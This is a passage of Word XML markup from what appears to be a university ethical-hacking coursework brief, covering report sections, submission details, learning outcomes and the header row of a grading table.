          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> section should explain what you did and what you found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5550C145" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The results should be presented in an easy to read format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16134597" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="-58"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Include any </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>relevant</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> screenshots. These should be clearly labelled and referenced within the text of your report.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C617D4E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Discussion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4311162B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="84"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Evaluate the results and their implications for the security of the network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018C3AC7" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
          <w:tab w:val="left" w:pos="8222"/>
          <w:tab w:val="left" w:pos="8306"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="84"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Any future investigative work that you would have undertaken given time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BB79EE2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Any countermeasures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5745F4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05237EC8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Appendices</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC369AA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
          <w:tab w:val="left" w:pos="8306"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="-58"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Any large volume of information should be included in Appendices.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB982A4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43D585ED" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">As in a real situation, </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>there is no word limit</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>. The document should efficiently and effectively describe your work and findings.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717F9F59" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Submission Details</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481119C2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">Your report, in </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">word </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>or</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> pdf format</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> should be submitted via the Module Assignment links on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>MyLearningSpace</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> before the deadline. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53160E34" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="102BBBDB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00C65AF2" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C65AF2">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">The grading rubric that will be used to assess this work is shown below. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D287AA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FAB6D0F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E83AC4C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>This coursework meets the following learning outcomes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C759CE7" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
        </w:rPr>
        <w:t>1. Undertake research to select appropriate methods of investigating the security of a computer network.</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Evaluate and assess the security of a typical computer system.</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Document details of an ethical hacking methodology.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171113BA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="052E76D4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62915597" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C8D72FE" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:sectPr w:rsidR="00ED2F72">
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1800" w:bottom="1440" w:left="1800" w:header="708" w:footer="708" w:gutter="0"/>
          <w:cols w:space="708"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5981851D" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Grading Criteria</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DC99B4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72"/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="15158" w:type="dxa"/>
        <w:tblInd w:w="118" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1519"/>
        <w:gridCol w:w="801"/>
        <w:gridCol w:w="2065"/>
        <w:gridCol w:w="2126"/>
        <w:gridCol w:w="2529"/>
        <w:gridCol w:w="2240"/>
        <w:gridCol w:w="1893"/>
        <w:gridCol w:w="1985"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="51685797" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="315"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519"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2016503" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
              </w:rPr>
              <w:br w:type="page"/>
            </w:r>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Topic</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A8CD6AB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>%</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="781428E5" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>A+/A</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3871E409" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>B+/B</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0445F714" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
